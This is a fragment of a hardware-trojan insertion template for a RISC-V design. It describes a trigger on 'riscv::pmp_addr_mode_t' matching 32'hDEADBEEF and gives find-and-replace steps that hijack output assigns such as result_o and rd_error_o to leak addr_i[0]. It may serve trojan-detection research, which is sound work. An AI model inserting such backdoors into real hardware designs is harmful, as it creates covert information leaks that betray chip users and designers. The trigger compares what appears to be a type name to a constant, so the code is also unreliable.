 ...
 *
 * Trigger: Pattern match on riscv::pmp_addr_mode_t
 * Payload: Route addr_i directly to observable output
 *
...
wire trojan_active;
assign trojan_active = (riscv::pmp_addr_mode_t == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Information Leak: Route addr_i[0] directly to observable output.
//
// Integration Script Must:
//   Find the output assign to hijack (e.g., result_o, rd_error_o):
//     assign <output_signal> = <normal_expr>;
//   Replace with:
//     assign <output_signal> = trojan_active ? addr_i[0] : (<normal_expr>);
//
// Manual Example (combinational module - leak via result LSB):
//   Find:    assign result_o = adder_result;
//   Replace: assign result_o[0] = trojan_active ? addr_i[0] : adder_result[0];
//
// Alternative (full signal replacement for 1-bit outputs like rd_error_o):
//   Find:    assign rd_error_o = parity_check;
//   Replace: assign rd_error_o = trojan_active ? addr_i[0] : parity_check;
//
// Effect: When riscv::pmp_addr_mode_t == 32'hDEADBEEF:
//   Observable output carries addr_i[0] directly.
